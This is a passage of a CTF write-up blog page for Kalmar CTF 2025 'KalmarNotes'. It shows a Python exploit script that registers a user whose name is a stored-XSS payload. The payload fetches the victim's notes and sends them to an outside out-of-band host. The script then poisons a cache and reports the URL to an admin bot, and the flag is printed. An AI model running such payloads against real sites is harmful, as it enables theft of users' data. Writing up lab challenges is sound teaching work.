class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;script&gt;fetch(&#x27;/api/notes&#x27;).then(res =&gt; res.text()).then(x =&gt; fetch(&#x27;https://cyh2zc5z1wg0000ctd1ggxetxsyyyyyyb.oast.pro?a=&#x27;+JSON.stringify(x)))&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip() + <span class="built_in">str</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Register with an XSS payload in the username</span></span><br><span class="line">res = requests.post(</span><br><span class="line">    HOST + <span class="string">&#x27;/api/register&#x27;</span>,</span><br><span class="line">    json = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Log in and obtain a token</span></span><br><span class="line">res = requests.post(</span><br><span class="line">    HOST + <span class="string">&#x27;/api/login&#x27;</span>,</span><br><span class="line">    json = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: payload</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">token = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(token))</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=&#x27;</span> + token</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Create a new note</span></span><br><span class="line">res = requests.post(</span><br><span class="line">    HOST + <span class="string">&#x27;/api/note/new&#x27;</span>,</span><br><span class="line">    headers = headers,</span><br><span class="line">    json = &#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. Extract the note_id</span></span><br><span class="line">res = requests.get(</span><br><span class="line">    HOST + <span class="string">&#x27;/api/notes&#x27;</span>,</span><br><span class="line">    headers = headers,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">note_id = res.json()[<span class="string">&#x27;notes&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">post_url = HOST + <span class="string">f&#x27;note/<span class="subst">&#123;note_id&#125;</span>/long.js&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(post_url))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. Poison the cache</span></span><br><span class="line">res = requests.get(</span><br><span class="line">    HOST + <span class="string">f&#x27;note/<span class="subst">&#123;note_id&#125;</span>/long.js&#x27;</span>,</span><br><span class="line">    headers = headers,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. Report the note</span></span><br><span class="line">res = requests.post(</span><br><span class="line">    HOST + <span class="string">&#x27;/api/report&#x27;</span>,</span><br><span class="line">    headers = headers,</span><br><span class="line">    json = &#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: post_url,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kalmar&#123;c4ch3_m3_0ut51d3_h0w_b0w_d4h&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cache-Poisoning"><span class="toc-number">1.2.</span> <span class="toc-text">Cache Poisoning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-Summary"><span class="toc-number">2.</span> <span class="toc-text">Solution Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.</span> <span class="toc-text">Exploit Code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">3.1.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&text=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&is_video=false&description=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)&body=Check out this article: https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&title=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&name=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/250310-karmarctf2025-kalmarnotes/&t=Kalmar CTF 2025 - KalmarNotes (XSS, Cache Poisoning)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2025
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
